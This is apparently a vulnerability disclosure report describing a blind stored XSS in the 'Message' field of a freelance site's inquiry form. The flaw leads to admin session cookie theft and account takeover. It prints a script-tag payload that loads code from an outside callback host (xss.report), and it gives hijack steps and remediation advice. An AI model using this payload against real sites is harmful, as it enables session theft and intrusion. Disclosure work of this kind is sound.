## Title
Blind XSS - Freelance Full-Stack Developer
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://freelance.pwnedbox.site/

<!-- Explain what the vulnerability is, where it exists, and why it is a security issue. Include the affected URL or endpoint. -->
**Affected Parameter / Field:** `Message` (Contact / Project Inquiry Form)  

**Vulnerability Type:** Blind Cross-Site Scripting (Blind XSS) -> Admin Account Takeover

A **Blind Cross-Site Scripting (XSS)** vulnerability exists in the **Message** field of the **Start your project** contact form (`https://freelance.pwnedbox.site`). User-supplied input submitted through the public inquiry form is stored in the backend database and rendered unescaped inside the administrative inquiry detail page (`/admin/inquiry.php?id=<ID>`).

Because the `PHPSESSID` session cookie lacks the `HttpOnly` flag and the application fails to sanitize HTML tags or enforce a Content Security Policy, an unauthenticated attacker can inject an external script payload (`<ScRiPt src=...>`) that executes automatically when an administrator views the inquiry—exfiltrating the administrator's session cookie and enabling **full administrative account takeover**.

## Steps to Reproduce
1. Navigate to `https://freelance.pwnedbox.site`, fill in valid details for **Full Name**, **Email**, **Phone**, and **Service Inquiry**, enter `'"><ScRiPt src=https://xss.report/c/{account_name}></ScRiPt>` into the **Message** field, and click **Send Project Inquiry**.
2. Log in to the admin panel and click **View** on the submitted inquiry.
3. Observe on `xss.report` that the Blind XSS callback fires immediately, capturing the admin URL , screenshot, and non-`HttpOnly` `PHPSESSID` cookie (`e02f04959b1a9c9e49ee30cb5b0319ee`).
4. In an unauthenticated browser session , replace the `PHPSESSID` cookie value via DevTools (`Application -> Cookies`) with the captured admin `PHPSESSID` and navigate to `https://freelance.pwnedbox.siteadmin/index.php` to confirm full administrative access.


## POC (Proof of Concept)
<!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
**1. Submit form with payload in message field**

<img width="1600" height="810" alt="image" src="https://github.com/user-attachments/assets/ca0f9d5a-ccf4-4e96-951e-eda683c305ba" />

**2. Log in as admin and check the form**

<img width="1600" height="802" alt="image" src="https://github.com/user-attachments/assets/1fe70311-95ea-4056-ba68-ca634da3b5fb" />

**3. See that admin's cookie has been captured via xss.report**

<img width="1600" height="813" alt="image" src="https://github.com/user-attachments/assets/a6beb5fb-a642-4dc2-bb74-ac3e735d5289" />

**4. Use cookie of admin in normal user's browser session**

<img width="1600" height="779" alt="image" src="https://github.com/user-attachments/assets/84c7d747-f0c3-4f7a-adfb-be4647d18696" />

**5. Observe admin account takeover**

<img width="1600" height="768" alt="image" src="https://github.com/user-attachments/assets/973595ac-dc83-4b42-afb3-a51719e7ba06" />

## Impact
An unauthenticated external attacker can achieve **full administrative account takeover** without needing prior credentials or user interaction beyond normal administrative workflow (viewing incoming client inquiries). Successful exploitation allows an attacker to:
* Steal active administrator session cookies (`PHPSESSID`) and hijack privileged admin sessions.
* View, modify, or delete all confidential client inquiries and sensitive business data.
* Deface the website or pivot to further server-side attacks from the authenticated admin panel.

## Remediation
* **Context-Aware Output Encoding:** Encode all user-supplied contact form fields (including `Message`, `Full Name`, and `Email`) using HTML entity encoding (`<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, `'` to `&#x27;`) before rendering them inside `/admin/inquiry.php` and `/admin/index.php`.
* **Set `HttpOnly` and `Secure` Cookie Flags:** Configure the `PHPSESSID` session cookie with `HttpOnly`, `Secure`, and `SameSite=Strict` (or `Lax`) attributes so sensitive session tokens cannot be read via `document.cookie`.
* **Implement Content Security Policy (CSP):** Configure a strict `Content-Security-Policy` HTTP response header (e.g., `default-src 'self'; script-src 'self'`) to block unauthorized external script domains (`xss.report`) and inline JavaScript execution.
